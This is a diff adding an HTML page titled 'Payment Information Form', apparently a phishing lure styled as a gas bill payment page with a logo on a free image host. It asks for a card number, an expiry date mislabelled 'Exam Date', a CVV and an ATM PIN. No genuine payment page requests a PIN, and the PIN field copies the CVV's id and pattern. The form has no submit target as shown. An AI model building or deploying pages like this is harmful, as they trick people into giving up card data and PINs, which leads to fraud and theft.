@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Information Form</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+    body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 20px;
+}
+
+.container {
+    max-width: 400px;
+    margin: auto;
+    background: white;
+    padding: 20px;
+    border-radius: 5px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+h1 {
+    text-align: center;
+}
+
+label {
+    display: block;
+    margin: 10px 0 5px;
+}
+
+input, select, button {
+    width: 90%;
+    padding: 10px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+
+button {
+    background-color: #28a745;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #218838;
+}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <center>
+   <img src="https://i.postimg.cc/2SvKCH20/Photoroom-20241020-165327.png" alt="Gas Bill Image" style="width: 100px"></center>
+        <form>
+            <label for="cardNumber">Card Number*</label>
+            <input type="text" id="cardNumber" name="cardNumber" required pattern="\d{16}" maxlength="16" placeholder="1234 5678 9012 3456">
+
+            <label for="examDate">Exam Date*</label>
+            <input type="text" id="examDate" name="examDate" maxlength="5" placeholder="00/00" required>
+
+            <label for="cvv">CVV Number*</label>
+            <input type="text" id="cvv" name="cvv" required pattern="\d{3}" maxlength="3" placeholder="123">
+            <label for="cvv">ATM PIN*</label>
+            <input type="text" id="cvv" name="cvv" required pattern="\d{3}" maxlength="4" placeholder="0000">
+<center>
+            <button type="submit">Submit</button>
+            </center>
+        </form>
+    </div>
+</body>
+</html>
